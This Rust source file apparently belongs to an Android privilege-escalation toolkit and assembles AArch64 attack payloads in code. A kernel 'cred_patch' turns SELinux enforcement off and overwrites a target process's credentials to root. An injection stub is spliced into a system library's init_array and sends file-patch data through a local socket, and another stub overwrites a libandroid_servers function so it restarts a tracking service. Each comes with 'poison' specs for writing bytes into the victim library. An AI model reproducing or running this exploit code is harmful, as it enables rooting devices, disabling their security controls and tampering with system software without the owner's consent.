// Blob generators: carrier init patch (byte template), cred-patch, init_array inject stub, and the
// libandroid_servers restart stub — all assembled in Rust (no clang). Plus build_carrier/build_cfg.
#![allow(dead_code)]
use crate::asm::Asm;
use crate::aes::keystream0;

pub const R_AARCH64_CALL26: u32 = 0x11b;

// 52-byte carrier init patch template (reloc-free; reads the CALL26'd anchor as data). movz x2 @0x1c
// / movk x2 @0x20 carry the selinux delta.
const PATCH_INIT: [u8; 52] = hexlit(concat!(
    "3f2303d5", "81000010", "220040b9", "42644093",
    "02000014", "00000094", "21c8228b", "025199d2",
    "823da0f2", "2100028b", "3f000039", "bf2303d5",
    "c0035fd6"));

const fn hexlit<const N: usize>(s: &str) -> [u8; N] {
    let b = s.as_bytes();
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        let hi = hexv(b[i * 2]);
        let lo = hexv(b[i * 2 + 1]);
        out[i] = (hi << 4) | lo;
        i += 1;
    }
    out
}
const fn hexv(c: u8) -> u8 {
    match c { b'0'..=b'9' => c - b'0', b'a'..=b'f' => c - b'a' + 10, _ => 0 }
}

pub fn build_patch_init(delta: u32) -> [u8; 52] {
    let mut p = PATCH_INIT;
    let imm0 = (delta & 0xffff) as u32;
    let imm1 = ((delta >> 16) & 0xffff) as u32;
    p[0x1c..0x20].copy_from_slice(&(0xD2800002u32 | (imm0 << 5)).to_le_bytes()); // movz x2,#imm0
    p[0x20..0x24].copy_from_slice(&(0xF2A00002u32 | (imm1 << 5)).to_le_bytes()); // movk x2,#imm1,lsl16
    p
}

// ------------------------------------------------------------------ cred-patch
/// Returns (.patch bytes, anchor64 offset). Mirrors asm/cred_patch.S.tmpl.
/// deltas are signed 32-bit (symbol - __platform_driver_register). ctx=Some(off) adds the
/// SELinux-context=kernel block using cred->security offset.
pub fn cred_patch(dsel: i64, dfv: i64, dpt: i64, pid: i64, dssuse: i64,
                  enf_off: u32, cred_off: u32, ctx: Option<u32>) -> (Vec<u8>, usize) {
    let lo = |v: i64| (v as u32 & 0xffff) as u16;
    let hi = |v: i64| ((v as u32 >> 16) & 0xffff) as u16;
    let mut a = Asm::new();
    a.paciasp();
    a.stp_x_preidx(29, 30, 31, -64);
    a.stp_x(19, 20, 31, 16);
    a.stp_x(21, 22, 31, 32);
    a.mov_fp_sp();
    a.adr(0, "anchor64");
    a.ldr_x(19, 0, 0);
    a.b("skip");
    a.balign(8);
    a.label("anchor64");
    a.quad(0);
    a.label("skip");
    // enforcing = 0
    a.movz_w(1, lo(dsel), 0); a.movk_w(1, hi(dsel), 1);
    a.add_x_w_sxtw(2, 19, 1);
    a.strb(31, 2, enf_off);
    // selinux_status_update_setenforce(&state, 0)
    a.movz_w(3, lo(dssuse), 0); a.movk_w(3, hi(dssuse), 1);
    a.add_x_w_sxtw(4, 19, 3);
    a.mov_x(0, 2);
    a.mov_x_xzr(1);
    a.blr(4);
    // find_vpid (x20)
    a.movz_w(1, lo(dfv), 0); a.movk_w(1, hi(dfv), 1);
    a.add_x_w_sxtw(20, 19, 1);
    // pid_task (x21)
    a.movz_w(1, lo(dpt), 0); a.movk_w(1, hi(dpt), 1);
    a.add_x_w_sxtw(21, 19, 1);
    // find_vpid(pid)
    a.movz_w(0, lo(pid), 0); a.movk_w(0, hi(pid), 1);
    a.blr(20);
    a.cbz_x(0, "done");
    a.mov_x_imm(1, 0);
    a.blr(21);
    a.cbz_x(0, "done");
    // cred = task->cred; patch to root
    a.ldr_x(2, 0, cred_off);
    a.stp_w(31, 31, 2, 4);
    a.stp_w(31, 31, 2, 12);
    a.stp_w(31, 31, 2, 20);
    a.stp_w(31, 31, 2, 28);
    a.mov_x_imm(3, -1);
    a.stp_x(3, 3, 2, 40);
    a.stp_x(3, 3, 2, 56);
    a.str_x(3, 2, 72);
    if let Some(cso) = ctx {
        a.ldr_x(4, 2, cso);
        a.cbz_x(4, "done");
        a.orr_w_1(5);
        a.stp_w(5, 5, 4, 0);
    }
    a.label("done");
    a.mov_w_wzr(0);
    a.ldp_x(21, 22, 31, 32);
    a.ldp_x(19, 20, 31, 16);
    a.ldp_x_postidx(29, 30, 31, 64);
    a.autiasp();
    a.ret();
    let (code, labels) = a.finish();
    let anchor = labels["anchor64"];
    (code, anchor)
}

// ------------------------------------------------------------------ inject stub
struct Rng(u64);
impl Rng {
    fn new(seed: u64) -> Self { Rng(seed) }
    fn next8(&mut self) -> [u8; 8] {
        // xorshift64* — quality irrelevant (IVs only need to satisfy ks0(iv)==need)
        let mut x = self.0;
        x ^= x >> 12; x ^= x << 25; x ^= x >> 27;
        self.0 = x;
        (x.wrapping_mul(0x2545F4914F6CDD1D)).to_le_bytes()
    }
}

/// files: (device_path, cur_bytes, want_bytes). Returns (stub bytes, poison spec, per-file diff counts).
pub fn build_inject_stub(spi: u32, keymat_base: u8, port: u16,
                         gap_off: u64, gap_size: usize, orig_ctor: u64, init_array_off: u64,
                         files: &[(String, Vec<u8>, Vec<u8>)]) -> Result<(Vec<u8>, Vec<u8>, Vec<usize>), String> {
    let spi_bytes = [(spi >> 24) as u8, (spi >> 16) as u8, (spi >> 8) as u8, spi as u8];
    let diffs: Vec<Vec<(u32, u8)>> = files.iter().map(|(_, cur, want)| {
        (0..want.len()).filter(|&i| cur[i] != want[i]).map(|i| (i as u32, cur[i] ^ want[i])).collect()
    }).collect();
    let n = files.len();

    let mut a = Asm::new();
    a.label("_stub");
    a.bti_c();
    a.sub_imm(31, 31, 112);
    a.stp_x(19, 20, 31, 32);
    a.stp_x(21, 22, 31, 48);
    a.stp_x(23, 24, 31, 64);
    a.str_x(30, 31, 24);
    a.adr(0, "spihdr");
    a.ldr_x(0, 0, 0);
    a.str_x(0, 31, 0);
    a.mov_w_imm(0, 2);
    a.mov_w_imm(1, 2);
    a.mov_w_wzr(2);
    a.mov_x_imm(8, 198);
    a.svc0();
    a.mov_x(20, 0);
    a.mov_x(0, 20);
    a.adr(1, "sockaddr");
    a.mov_w_imm(2, 16);
    a.mov_x_imm(8, 203);
    a.svc0();
    for i in 0..n {
        a.mov_x_imm(0, -100);
        a.adr(1, &format!("path{}", i));
        a.mov_w_wzr(2);
        a.mov_w_wzr(3);
        a.mov_x_imm(8, 56);
        a.svc0();
        a.mov_x(19, 0);
        a.adr(21, &format!("table{}", i));
        a.adr(0, &format!("cnt{}", i));
        a.ldr_w(22, 0, 0);
        a.bl("sendloop");
        a.mov_x(0, 19);
        a.mov_x_imm(8, 57);
        a.svc0();
    }
    a.ldr_x(30, 31, 24);
    a.ldp_x(19, 20, 31, 32);
    a.ldp_x(21, 22, 31, 48);
    a.ldp_x(23, 24, 31, 64);
    a.add_imm(31, 31, 112);
    a.label("tailcall");
    a.word(0);
    a.label("sendloop");
    a.mov_x(23, 30);
    a.label("sl_loop");
    a.ldr_w(0, 21, 0);
    a.str_x(0, 31, 16);
    a.ldur_x(1, 21, 4);
    a.str_x(1, 31, 8);
    a.mov_x(0, 20);
    a.mov_x_sp(1);
    a.mov_w_imm(2, 16);
    a.movz_w(3, 0x8000, 0);
    a.mov_x_xzr(4);
    a.mov_x_xzr(5);
    a.mov_x_imm(8, 206);
    a.svc0();
    a.mov_x(0, 20);
    a.mov_x(1, 19);
    a.add_imm(2, 31, 16);
    a.mov_w_imm(3, 17);
    a.mov_x_imm(8, 71);
    a.svc0();
    a.mov_x(0, 20);
    a.mov_x_xzr(1);
    a.mov_w_wzr(2);
    a.mov_w_wzr(3);
    a.mov_x_xzr(4);
    a.mov_x_xzr(5);
    a.mov_x_imm(8, 206);
    a.svc0();
    a.add_imm(21, 21, 12);
    a.subs_w_imm(22, 22, 1);
    a.bne("sl_loop");
    a.ret_reg(23);
    a.balign(8);
    a.label("spihdr");
    a.bytes(&spi_bytes);
    a.bytes(&[0x00, 0x00, 0x00, 0x01]);
    a.label("sockaddr");
    a.bytes(&[0x02, 0x00, 0x00, 0x00, 0x7f, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0, 0, 0]);
    for i in 0..n {
        a.label(&format!("cnt{}", i));
        a.word(0);
        a.label(&format!("path{}", i));
        a.asciz(&files[i].0);
        a.balign(4);
        a.label(&format!("table{}", i));
        a.space(diffs[i].len() * 12);
    }
    let (mut raw, labels) = a.finish();

    // fill tables with (offset, IV) records; IV chosen so ks0(iv)==need
    let ks0 = keystream0(keymat_base);
    let mut rng = Rng::new(0xC0FFEE1234567);
    for i in 0..n {
        let toff = labels[&format!("table{}", i)];
        for (j, &(o, need)) in diffs[i].iter().enumerate() {
            let e = toff + j * 12;
            raw[e..e + 4].copy_from_slice(&o.to_le_bytes());
            let iv = loop { let iv = rng.next8(); if ks0(&iv) == need { break iv; } };
            raw[e + 4..e + 12].copy_from_slice(&iv);
        }
        let coff = labels[&format!("cnt{}", i)];
        raw[coff..coff + 4].copy_from_slice(&(diffs[i].len() as u32).to_le_bytes());
    }

    if raw.len() > gap_size {
        return Err(format!("stub {}B > inject-lib gap {}B (pick a lib with a bigger exec gap)", raw.len(), gap_size));
    }
    // tailcall b -> original ctor (runtime addr = gap + tailcall_off)
    let tc = labels["tailcall"];
    let imm = (((orig_ctor as i64 - (gap_off as i64 + tc as i64)) >> 2) as u32) & 0x03ffffff;
    raw[tc..tc + 4].copy_from_slice(&(0x14000000u32 | imm).to_le_bytes());
    // sockaddr port (big-endian) at sockaddr+2
    let sa = labels["sockaddr"];
    raw[sa + 2..sa + 4].copy_from_slice(&port.to_be_bytes());

    // poison spec: every stub byte at gap+i, then init_array[0] = gap
    let mut spec = Vec::new();
    for (i, &b) in raw.iter().enumerate() {
        spec.extend_from_slice(&((gap_off as u32) + i as u32).to_le_bytes());
        spec.push(b);
    }
    for (i, &b) in gap_off.to_le_bytes().iter().enumerate() {
        spec.extend_from_slice(&((init_array_off as u32) + i as u32).to_le_bytes());
        spec.push(b);
    }
    Ok((raw, spec, diffs.iter().map(|d| d.len()).collect()))
}

/// Revert spec for the inject-lib poison: zero the stub gap, restore init_array[0] to orig ctor.
pub fn inject_restore_spec(gap_off: u64, init_array_off: u64, orig_ctor: u64, stub_len: usize) -> Vec<u8> {
    let mut spec = Vec::new();
    for i in 0..stub_len {
        spec.extend_from_slice(&((gap_off as u32) + i as u32).to_le_bytes());
        spec.push(0);
    }
    for (i, &b) in orig_ctor.to_le_bytes().iter().enumerate() {
        spec.extend_from_slice(&((init_array_off as u32) + i as u32).to_le_bytes());
        spec.push(b);
    }
    spec
}

// ------------------------------------------------------------------ libandroid_servers::dump stub
/// Returns (stub bytes, poison spec). Restart the tracking daemon via a property_service SETPROP2.
pub fn build_libas_stub(prop_socket: &str, tracking_svc: &str, dump_off: u64, dump_size: usize)
    -> Result<(Vec<u8>, Vec<u8>), String> {
    let ctl = "ctl.restart";
    let mut msg = Vec::new();
    msg.extend_from_slice(&0x00020001u32.to_le_bytes());
    msg.extend_from_slice(&(ctl.len() as u32).to_le_bytes());
    msg.extend_from_slice(ctl.as_bytes());
    msg.extend_from_slice(&(tracking_svc.len() as u32).to_le_bytes());
    msg.extend_from_slice(tracking_svc.as_bytes());
    let saddrlen = (2 + prop_socket.len() + 1) as u16;

    let mut a = Asm::new();
    a.label("_stub");
    a.bti_c();
    a.sub_imm(31, 31, 16);
    a.mov_w_imm(0, 1);
    a.mov_w_imm(1, 1);
    a.mov_w_wzr(2);
    a.mov_x_imm(8, 198);
    a.svc0();
    a.mov_x(9, 0);
    a.mov_x(0, 9);
    a.adr(1, "saddr");
    a.mov_w_imm(2, saddrlen);
    a.mov_x_imm(8, 203);
    a.svc0();
    a.mov_x(0, 9);
    a.adr(1, "msg");
    a.mov_w_imm(2, msg.len() as u16);
    a.mov_x_imm(8, 64);
    a.svc0();
    a.mov_x(0, 9);
    a.mov_x_sp(1);
    a.mov_w_imm(2, 4);
    a.mov_x_imm(8, 63);
    a.svc0();
    a.mov_x(0, 9);
    a.mov_x_imm(8, 57);
    a.svc0();
    a.add_imm(31, 31, 16);
    a.ret();
    a.balign(4);
    a.label("saddr");
    a.bytes(&[0x01, 0x00]);
    a.asciz(prop_socket);
    a.balign(4);
    a.label("msg");
    a.bytes(&msg);
    let (raw, _labels) = a.finish();

    if raw.len() > dump_size {
        return Err(format!("libas stub {}B > dump fn {}B", raw.len(), dump_size));
    }
    let mut spec = Vec::new();
    for (i, &b) in raw.iter().enumerate() {
        spec.extend_from_slice(&((dump_off as u32) + i as u32).to_le_bytes());
        spec.push(b);
    }
    Ok((raw, spec))
}

pub fn libas_restore_spec(dump_off: u64, orig_bytes: &[u8]) -> Vec<u8> {
    let mut spec = Vec::new();
    for (i, &b) in orig_bytes.iter().enumerate() {
        spec.extend_from_slice(&((dump_off as u32) + i as u32).to_le_bytes());
        spec.push(b);
    }
    spec
}
